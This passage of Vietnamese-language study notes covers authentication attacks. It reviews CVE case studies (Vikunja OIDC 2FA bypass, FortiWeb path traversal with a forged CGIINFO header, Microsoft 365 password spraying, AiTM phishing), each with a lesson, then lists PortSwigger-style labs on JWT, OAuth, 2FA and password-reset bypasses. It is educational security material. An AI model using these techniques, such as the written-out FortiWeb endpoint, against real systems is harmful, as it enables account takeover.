> - **Bài học**: Luôn whitelist `redirect_uri` một cách nghiêm ngặt. Không sử dụng regex lỏng lẻo. Xác thực chính xác host, path và scheme.
> 
> ---
> 
> ### 🔑 Case 4: 2FA Bypass via OIDC — Vikunja (CVE-2026-34727)
> 
> - **Lỗ hổng**: Vikunja (nền tảng quản lý công việc) đã cấp phát JWT token đầy đủ trong OIDC callback handler mà không kiểm tra xem người dùng đã bật TOTP (2FA) hay chưa. Khi người dùng local có TOTP được khớp qua cơ chế email fallback của OIDC, yếu tố thứ hai (2FA) đã bị bỏ qua hoàn toàn.
> - **Khai thác**: Kẻ tấn công đã biết thông tin đăng nhập hợp lệ (username/password) của nạn nhân nhưng không có mã TOTP. Bằng cách lợi dụng luồng OIDC, chúng có thể nhận được JWT đầy đủ quyền truy cập mà không cần cung cấp mã 2FA.
> - **Bài học**: Mọi luồng xác thực (bao gồm OAuth/OIDC) phải kiểm tra trạng thái 2FA của người dùng. Không bao giờ bỏ qua yếu tố thứ hai chỉ vì người dùng đến từ một luồng xác thực khác.
> 
> ---
> 
> ### 🔑 Case 5: Auth Bypass via Path Traversal + Header Injection — Fortinet FortiWeb (CVE-2025-64446)
> 
> - **Lỗ hổng**: Fortinet FortiWeb (WAF) chứa một lỗ hổng authentication bypass nghiêm trọng, cho phép kẻ tấn công chiếm quyền admin và tạo tài khoản quản trị mới. Lỗ hổng là sự kết hợp của hai lỗi: path traversal trong HTTP request để truy cập binary `fwbcgi`, và authentication bypass thông qua nội dung header `CGIINFO`.
> - **Khai thác**: Kẻ tấn công gửi một HTTP POST request đến endpoint `/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi` với header `CGIINFO` chứa JSON đã mã hóa Base64. Binary `fwbcgi` giải mã và parse JSON, trích xuất các trường `username`, `profname`, `vdom`, `loginname`. Bằng cách cung cấp các giá trị của tài khoản admin mặc định, kẻ tấn công có thể mạo danh bất kỳ người dùng nào, bao gồm cả admin.
> - **Bài học**: Không bao giờ tin tưởng header do client gửi. Xác thực và làm sạch mọi input, đặc biệt là các header tùy chỉnh. Ngăn chặn path traversal trong tất cả các endpoint.
> 
> ---
> 
> ### 🔑 Case 6: Username Enumeration & Password Spraying — Microsoft 365 (2025)
> 
> - **Lỗ hổng**: Một botnet gồm hơn 130.000 thiết bị đã thực hiện tấn công password spraying (thử một mật khẩu phổ biến với nhiều username) nhắm vào tài khoản Microsoft 365 trên toàn cầu. Cuộc tấn công đã vượt qua MFA bằng cách khai thác xác thực cơ bản (basic authentication) vẫn được bật trên một số tenant.
> - **Khai thác**: Botnet sử dụng danh sách username (có thể thu thập qua username enumeration) và thử một vài mật khẩu phổ biến cho mỗi tài khoản. Vì basic authentication không hỗ trợ MFA, các tài khoản sử dụng phương thức này đã bị xâm phạm mà không cần vượt qua 2FA.
> - **Bài học**: Vô hiệu hóa basic authentication. Triển khai rate-limiting và CAPTCHA. Giám sát các cuộc tấn công password spraying.
> 
> ---
> 
> ### 🔑 Case 7: MFA Bypass via Adversary-in-the-Middle — BigBear 2.0 (2026)
> 
> - **Lỗ hổng**: Framework phishing-as-a-service BigBear 2.0 đã được sử dụng để vượt qua MFA tại 258 tổ chức, đánh cắp hơn 5.000 thông tin đăng nhập Microsoft 365. Kỹ thuật là adversary-in-the-middle (AiTM): kẻ tấn công đứng giữa người dùng và trang đăng nhập thật, đánh cắp session cookie sau khi nạn nhân hoàn tất xác thực (bao gồm cả MFA).
> - **Khai thác**: Nạn nhân nhận được email phishing, nhập thông tin đăng nhập vào trang giả mạo. Trang này chuyển tiếp thông tin đến trang thật, sau đó đánh cắp session cookie đã được xác thực (bao gồm cả MFA) và gửi về cho kẻ tấn công. Kẻ tấn công sử dụng cookie đó để truy cập tài khoản mà không cần MFA.
> - **Bài học**: MFA không chống được AiTM phishing. Cần triển khai FIDO2/WebAuthn (passkeys) để chống phishing. Giám sát session cookie bất thường.
> 
> ---
> 
> ###  Bảng tóm tắt các case study
> 
> | Case | Kỹ thuật | Sản phẩm | Hậu quả | Bài học chính |
> |------|----------|----------|---------|---------------|
> | 1 | JWT signature bypass | Microsoft Titan | Truy cập 17,3 nghìn tỷ dòng | Luôn xác minh chữ ký JWT |
> | 2 | Password reset token leak | Flowise | Chiếm đoạt tài khoản | Token reset phải gửi qua email |
> | 3 | OAuth redirect_uri bypass | GitHub Enterprise | Chiếm đoạt tài khoản | Whitelist redirect_uri nghiêm ngặt |
> | 4 | 2FA bypass via OIDC | Vikunja | Bỏ qua TOTP | Kiểm tra 2FA trong mọi luồng |
> | 5 | Path traversal + header injection | Fortinet FortiWeb | Tạo admin trái phép | Không tin header client |
> | 6 | Password spraying | Microsoft 365 | Xâm phạm tài khoản | Tắt basic auth, rate-limit |
> | 7 | AiTM phishing | BigBear 2.0 | Vượt MFA tại 258 tổ chức | Dùng FIDO2/WebAuthn |
> 


# Lab thực hành 
> [!NOTE]
> ### 🔑 1. Lỗi Logic trong Xác thực (Authentication Logic Flaws)
> 
> Đây là các bài lab khai thác sai sót trong luồng xử lý xác thực, cho phép bỏ qua các bước kiểm tra.
> 
> *   **Lab: 2FA simple bypass (APPRENTICE)**
>     *   **Mô tả:** Sau khi đăng nhập bằng username/password hợp lệ, ứng dụng yêu cầu nhập mã 2FA. Lỗi logic cho phép bỏ qua bước này bằng cách truy cập trực tiếp vào URL của trang tài khoản (`/my-account`).
>     *   **Kỹ thuật:** Thay đổi URL để bỏ qua bước xác minh 2FA.
> 
> *   **Lab: 2FA bypass using a brute-force attack (PRACTITIONER)**
>     *   **Mô tả:** Mã 2FA là một số có 4 chữ số. Mặc dù có cơ chế đăng xuất sau vài lần thử sai, nhưng có thể vượt qua bằng cách sử dụng **Burp Macros** để tự động đăng nhập lại trước mỗi lần thử, cho phép brute-force toàn bộ 10.000 tổ hợp.
>     *   **Kỹ thuật:** Brute-force mã 2FA kết hợp với Burp Macros để duy trì session.
> 
> *   **Lab: Authentication bypass via encryption oracle (PRACTITIONER)**
>     *   **Mô tả:** Ứng dụng có một lỗi logic cho phép sử dụng chức năng phản hồi (comment) như một **encryption oracle** để mã hóa và giải mã dữ liệu tùy ý. Bằng cách này, có thể tạo ra một cookie `stay-logged-in` giả mạo cho user `administrator`.
>     *   **Kỹ thuật:** Khai thác encryption oracle để giả mạo cookie xác thực.
> 
> *   **Lab: Authentication bypass via information disclosure (PRACTITIONER)**
>     *   **Mô tả:** Giao diện admin có lỗ hổng bypass xác thực nhưng cần biết một custom HTTP header (`X-Custom-IP-Authorization`). Sử dụng phương thức `TRACE` để lộ header này, sau đó thêm header với giá trị `127.0.0.1` vào request để truy cập admin panel.
>     *   **Kỹ thuật:** Lộ thông tin qua TRACE method, sau đó bypass xác thực bằng header giả mạo.
> 
> *   **Lab: User role controlled by request parameter (APPRENTICE)**
>     *   **Mô tả:** Ứng dụng xác định quyền admin dựa trên một cookie có thể giả mạo (ví dụ: `Admin=true`). Chỉ cần sửa cookie để truy cập admin panel.
>     *   **Kỹ thuật:** Thao túng cookie để leo thang đặc quyền.
> 
> ---
> 
> ### 🔑 2. Tấn công vào JWT (JSON Web Token)
> 
> JWT là một cơ chế phổ biến để quản lý session, và các bài lab này khai thác các lỗi triển khai phổ biến.
> 
> *   **Lab: JWT authentication bypass via weak signing key (PRACTITIONER)**
>     *   **Mô tả:** Server sử dụng một **secret key rất yếu** (ví dụ: `secret1`) để ký JWT. Có thể brute-force secret này bằng `hashcat`, sau đó tự ký một token mới với `sub` là `administrator` để truy cập admin panel.
>     *   **Kỹ thuật:** Brute-force secret key của JWT.
> 
> *   **Lab: JWT authentication bypass via kid header path traversal (PRACTITIONER)**
>     *   **Mô tả:** Server sử dụng tham số `kid` (Key ID) trong header JWT như một **đường dẫn file** để tải key xác minh. Có thể khai thác **path traversal** để trỏ `kid` đến một file có nội dung đã biết (ví dụ: `/dev/null`), sau đó ký token bằng nội dung của file đó.
>     *   **Kỹ thuật:** Path traversal trong `kid` header để kiểm soát key xác minh.
> 
> *   **Lab: JWT authentication bypass via algorithm confusion (EXPERT)**
>     *   **Mô tả:** Server sử dụng thuật toán bất đối xứng (RS256) nhưng không kiểm tra chặt chẽ thuật toán trong header. Có thể thay đổi `alg` thành `HS256` và sử dụng **public key của server** (lấy từ `/jwks.json`) làm **secret key** để ký token mới, từ đó bypass xác thực.
>     *   **Kỹ thuật:** Algorithm confusion (RS256 → HS256).
> 
> *   **Lab: JWT authentication bypass via jwk header injection (EXPERT)**
>     *   **Mô tả:** Server hỗ trợ tham số `jwk` trong header JWT, cho phép nhúng public key trực tiếp vào token. Có thể tạo một cặp key mới, nhúng public key của mình vào header `jwk`, và ký token bằng private key của mình để server xác minh.
>     *   **Kỹ thuật:** JWK header injection.
> 
> ---
> 
> ### 🔑 3. Tấn công vào OAuth
> 
> Các bài lab này khai thác lỗi triển khai trong luồng OAuth 2.0.
> 
> *   **Lab: Authentication bypass via OAuth implicit flow (APPRENTICE)**
>     *   **Mô tả:** Ứng dụng client nhận thông tin user (bao gồm email) từ OAuth service và gửi một request `POST /authenticate` để đăng nhập. Do xác thực yếu, có thể thay đổi email trong request thành `carlos@carlos-montoya.net` để đăng nhập vào tài khoản của Carlos.
>     *   **Kỹ thuật:** Thao túng email trong request xác thực của OAuth implicit flow.
> 
> *   **Lab: Forced OAuth profile linking (PRACTITIONER)**
>     *   **Mô tả:** Chức năng liên kết tài khoản mạng xã hội với tài khoản blog thiếu tham số `state`, dẫn đến lỗ hổng **CSRF**. Có thể lừa admin click vào một iframe chứa authorization code của mình, từ đó liên kết tài khoản admin với profile mạng xã hội của attacker.
>     *   **Kỹ thuật:** CSRF trong luồng liên kết tài khoản OAuth.
> 
> *   **Lab: OAuth account hijacking via redirect_uri (PRACTITIONER)**
>     *   **Mô tả:** OAuth service không xác thực chặt chẽ tham số `redirect_uri`. Có thể thay đổi nó thành domain của attacker để đánh cắp authorization code của admin, sau đó sử dụng code này để đăng nhập vào tài khoản admin.
>     *   **Kỹ thuật:** Bypass `redirect_uri` để đánh cắp authorization code.
> 
> *   **Lab: Stealing OAuth access tokens via an open redirect (PRACTITIONER)**
>     *   **Mô tả:** Kết hợp lỗi `redirect_uri` với một **open redirect** trên ứng dụng client. Có thể tạo một URL độc hại khiến OAuth flow chuyển hướng access token đến server của attacker.
>     *   **Kỹ thuật:** Kết hợp `redirect_uri` bypass và open redirect để đánh cắp access token.
> 
> ---
> 
> ### 🔑 4. Tấn công vào Cơ chế Xác thực Khác
> 
> *   **Lab: Brute-forcing a stay-logged-in cookie (PRACTITIONER)**
>     *   **Mô tả:** Cookie `stay-logged-in` được cấu tạo theo format `base64(username:md5(password))`. Có thể brute-force cookie này bằng Burp Intruder để tìm ra mật khẩu của Carlos, từ đó đăng nhập vào tài khoản của anh ta.
>     *   **Kỹ thuật:** Brute-force cookie dựa trên cấu trúc đã biết.
> 
> *   **Lab: Password reset broken logic (PRACTITIONER)**
>     *   **Mô tả:** Chức năng reset mật khẩu có lỗi logic, cho phép thay đổi mật khẩu của user khác mà không cần token hợp lệ hoặc token không được gắn với đúng user.
>     *   **Kỹ thuật:** Lỗi logic trong quy trình reset mật khẩu.
> 
> *   **Lab: Username enumeration via different responses (APPRENTICE)**
>     *   **Mô tả:** Ứng dụng trả về thông báo lỗi khác nhau cho username tồn tại và không tồn tại, cho phép liệt kê danh sách username hợp lệ.
>     *   **Kỹ thuật:** Username enumeration qua phân tích response.
> 
> *   **Lab: Password reset poisoning via X-Forwarded-Host (PRACTITIONER)**
>     *   **Mô tả:** Ứng dụng tin tưởng header `X-Forwarded-Host` khi tạo link reset mật khẩu. Có thể thao túng header này để link reset trỏ đến domain của attacker, từ đó đánh cắp token reset của nạn nhân.
>     *   **Kỹ thuật:** Host header poisoning trong chức năng quên mật khẩu.
> 
> *   **Lab: Brute-force protection bypass with password arrays (PRACTITIONER)**
>     *   **Mô tả:** Endpoint đăng nhập chấp nhận một mảng các mật khẩu trong một request JSON duy nhất, cho phép thử nhiều mật khẩu cùng lúc và vượt qua các biện pháp bảo vệ brute-force như rate-limiting.
>     *   **Kỹ thuật:** Brute-force bypass bằng cách gửi nhiều mật khẩu trong một request.
> 
> ---
> 
> ### 📊 Bảng tóm tắt các bài lab
> 
> | Nhóm kỹ thuật      | Tên Lab                                                 | Độ khó       |
> | ------------------ | ------------------------------------------------------- | ------------ |
> | **2FA**            | 2FA simple bypass                                       | APPRENTICE   |
> | **2FA**            | 2FA bypass using a brute-force attack                   | PRACTITIONER |
> | **Logic Flaw**     | Authentication bypass via encryption oracle             | PRACTITIONER |
> | **Logic Flaw**     | Authentication bypass via information disclosure        | PRACTITIONER |
> | **Logic Flaw**     | User role controlled by request parameter               | APPRENTICE   |
> | **JWT**            | JWT authentication bypass via weak signing key          | PRACTITIONER |
> | **JWT**            | JWT authentication bypass via kid header path traversal | PRACTITIONER |
> | **JWT**            | JWT authentication bypass via algorithm confusion       | EXPERT       |
> | **JWT**            | JWT authentication bypass via jwk header injection      | EXPERT       |
> | **OAuth**          | Authentication bypass via OAuth implicit flow           | APPRENTICE   |
> | **OAuth**          | Forced OAuth profile linking                            | PRACTITIONER |
> | **OAuth**          | OAuth account hijacking via redirect_uri                | PRACTITIONER |
> | **OAuth**          | Stealing OAuth access tokens via an open redirect       | PRACTITIONER |
> | **Cookie**         | Brute-forcing a stay-logged-in cookie                   | PRACTITIONER |
> | **Password Reset** | Password reset broken logic                             | PRACTITIONER |
> | **Password Reset** | Password reset poisoning via X-Forwarded-Host           | PRACTITIONER |
> | **Enumeration**    | Username enumeration via different responses            | APPRENTICE   |
> | **Brute-force**    | Brute-force protection bypass with password arrays      | PRACTITIONER |
> 
> Hy vọng danh sách này sẽ giúp bạn có lộ trình thực hành rõ ràng. Nếu bạn cần đi sâu vào bất kỳ bài lab nào, hãy cho tôi biết nhé.

